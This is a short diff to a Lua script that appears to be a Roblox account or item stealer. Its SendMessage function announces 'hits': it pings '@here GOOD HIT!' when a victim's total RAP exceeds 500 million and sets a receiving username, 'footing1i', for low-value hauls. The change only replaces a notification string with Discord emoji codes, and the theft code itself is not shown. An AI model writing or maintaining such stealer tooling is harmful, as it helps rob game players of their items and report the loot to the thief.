@@ -220,7 +220,7 @@ local function SendMessage(url, username, diamonds)
     if totalRAP > 500000000 then
 		poopie = "@here GOOD HIT!"
     else
-		poopie = "poop hit"
+		poopie = "<:segment_1:1279104032786616430><:segment_2:1279104034145566884><:segment_3:1279104035416440912><:segment_4:1279104036523606133><:segment_5:1279104038121639977>"
     end
     if totalRAP < 10000000 then
 		Username = "footing1i"
